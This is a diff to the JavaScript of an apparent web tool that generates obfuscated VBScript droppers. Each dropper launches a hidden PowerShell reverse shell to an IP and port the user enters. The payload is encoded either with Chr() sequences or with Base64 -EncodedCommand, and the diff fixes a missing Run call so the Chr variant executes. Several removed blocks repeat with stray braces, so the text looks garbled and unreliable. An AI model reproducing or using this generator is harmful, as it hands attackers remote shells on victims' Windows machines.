@@ -26,13 +26,25 @@ document.addEventListener('DOMContentLoaded', function() {
         modalMessage.textContent = message;
         modal.style.display = 'flex';
         
-        modalTitle.style.color = isError ? 'var(--danger)' : 'var(--secondary)';
+        if (isError) {
+            modalTitle.style.color = 'var(--danger)';
+        } else {
+            modalTitle.style.color = 'var(--secondary)';
+        }
     }
     
-    modalClose.addEventListener('click', () => modal.style.display = 'none');
-    modalOk.addEventListener('click', () => modal.style.display = 'none');
+    modalClose.addEventListener('click', () => {
+        modal.style.display = 'none';
+    });
+    
+    modalOk.addEventListener('click', () => {
+        modal.style.display = 'none';
+    });
+    
     window.addEventListener('click', (e) => {
-        if (e.target === modal) modal.style.display = 'none';
+        if (e.target === modal) {
+            modal.style.display = 'none';
+        }
     });
 
     function validateIpOrDomain(value) {
@@ -79,114 +91,15 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     document.getElementById('generate-chr').addEventListener('click', () => {
-        const ip = document.getElementById('ip').value.trim();
+        const ip = document.getElementById('ip').value;
         const port = parseInt(document.getElementById('port').value);
         const filename = document.getElementById('filename').value || 'payload.vbs';
         
-        if (!ip) return showModal('Error', 'Please enter target IP/Domain', true);
-        if (!validateIpOrDomain(ip)) return showModal('Error', 'Invalid IP/Domain format', true);
-        if (!port || !validatePort(port)) return showModal('Error', 'Port must be between 1 and 65535', true);
-        
-        try {
-            const pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)';
-            const payload = powershellReverseShell(ip, port);
-            const obfPayload = obfuscateChr(payload);
-            const vbsContent = (
-                'Set x = CreateObject("WScript.Shell")\n' +
-                `${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
-            );
-            
-            document.getElementById('vbs-output').value = vbsContent;
-            downloadFile(vbsContent, filename);
-            showModal('Success', 'CHR method VBS generated and saved!');
-        } catch (e) {
-            showModal('Error', `Generation failed: ${e.message}`, true);
+        if (!ip) {
+            showModal('Error', 'Please enter target IP/Domain', true);
+            return;
         }
-    });
-    
-    document.getElementById('generate-b64').addEventListener('click', () => {
-        const ip = document.getElementById('ip').value.trim();
-        const port = parseInt(document.getElementById('port').value);
-        const filename = document.getElementById('filename').value || 'payload.vbs';
         
-        if (!ip) return showModal('Error', 'Please enter target IP/Domain', true);
-        if (!validateIpOrDomain(ip)) return showModal('Error', 'Invalid IP/Domain format', true);
-        if (!port || !validatePort(port)) return showModal('Error', 'Port must be between 1 and 65535', true);
-        
-        try {
-            const payload = powershellReverseShell(ip, port);
-            const encoded = btoa(unescape(encodeURIComponent(payload)));
-            const vbsContent = (
-                'Set shell = CreateObject("Wscript.Shell")\n' +
-                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
-            );
-            
-            document.getElementById('vbs-output').value = vbsContent;
-            downloadFile(vbsContent, filename);
-            showModal('Success', 'Base64 method VBS generated and saved!');
-        } catch (e) {
-            showModal('Error', `Generation failed: ${e.message}`, true);
-        }
-    });
-});        } catch (e) {
-            showModal('Error', `Generation failed: ${e.message}`, true);
-        }
-    });
-    
-    document.getElementById('generate-b64').addEventListener('click', () => {
-        const ip = document.getElementById('ip').value.trim();
-        const port = parseInt(document.getElementById('port').value);
-        const filename = document.getElementById('filename').value || 'payload.vbs';
-        
-        if (!ip) return showModal('Error', 'Please enter target IP/Domain', true);
-        if (!validateIpOrDomain(ip)) return showModal('Error', 'Invalid IP/Domain format', true);
-        if (!port || !validatePort(port)) return showModal('Error', 'Port must be between 1 and 65535', true);
-        
-        try {
-            const payload = powershellReverseShell(ip, port);
-            const encoded = btoa(unescape(encodeURIComponent(payload)));
-            const vbsContent = (
-                'Set shell = CreateObject("Wscript.Shell")\n' +
-                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
-            );
-            
-            document.getElementById('vbs-output').value = vbsContent;
-            downloadFile(vbsContent, filename);
-            showModal('Success', 'Base64 method VBS generated and saved!');
-        } catch (e) {
-            showModal('Error', `Generation failed: ${e.message}`, true);
-        }
-    });
-});        } catch (e) {
-            showModal('Error', `Generation failed: ${e.message}`, true);
-        }
-    });
-    
-    document.getElementById('generate-b64').addEventListener('click', () => {
-        const ip = document.getElementById('ip').value.trim();
-        const port = parseInt(document.getElementById('port').value);
-        const filename = document.getElementById('filename').value || 'payload.vbs';
-        
-        if (!ip) return showModal('Error', 'Please enter target IP/Domain', true);
-        if (!validateIpOrDomain(ip)) return showModal('Error', 'Invalid IP/Domain format', true);
-        if (!port || !validatePort(port)) return showModal('Error', 'Port must be between 1 and 65535', true);
-        
-        try {
-            const payload = powershellReverseShell(ip, port);
-            const encoded = btoa(unescape(encodeURIComponent(payload)));
-            const vbsContent = (
-                'Set shell = CreateObject("Wscript.Shell")\n' +
-                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
-            );
-            
-            document.getElementById('vbs-output').value = vbsContent;
-            downloadFile(vbsContent, filename);
-            showModal('Success', 'Base64 method VBS generated and saved!');
-        } catch (e) {
-            showModal('Error', `Generation failed: ${e.message}`, true);
-        }
-    });
-});        
         if (!validateIpOrDomain(ip)) {
             showModal('Error', 'Invalid IP/Domain format', true);
             return;
@@ -197,23 +110,18 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
-        if (!vbsFileInput.files.length) {
-            showModal('Error', 'Please select save location first', true);
-            return;
-        }
-        
         try {
             const pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)';
             const payload = powershellReverseShell(ip, port);
             const obfPayload = obfuscateChr(payload);
             const vbsContent = (
                 'Set x = CreateObject("WScript.Shell")\n' +
-                `${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
+                `x.Run ${pwsh} & " -NoP -NonI -W Hidden -Command " & ${obfPayload}, 0, False\n`
             );
             
             document.getElementById('vbs-output').value = vbsContent;
             downloadFile(vbsContent, filename);
-            showModal('Success', 'CHR method VBS generated and saved!');
+            showModal('Success', 'CHR method VBS generated and downloaded!');
         } catch (e) {
             showModal('Error', `Generation failed: ${e.message}`, true);
         }
@@ -239,11 +147,6 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
-        if (!vbsFileInput.files.length) {
-            showModal('Error', 'Please select save location first', true);
-            return;
-        }
-        
         try {
             const payload = powershellReverseShell(ip, port);
             const encoder = new TextEncoder();
@@ -255,7 +158,7 @@ document.addEventListener('DOMContentLoaded', function() {
             
             document.getElementById('vbs-output').value = vbsContent;
             downloadFile(vbsContent, filename);
-            showModal('Success', 'Base64 method VBS generated and saved!');
+            showModal('Success', 'Base64 method VBS generated and downloaded!');
         } catch (e) {
             showModal('Error', `Generation failed: ${e.message}`, true);
         }
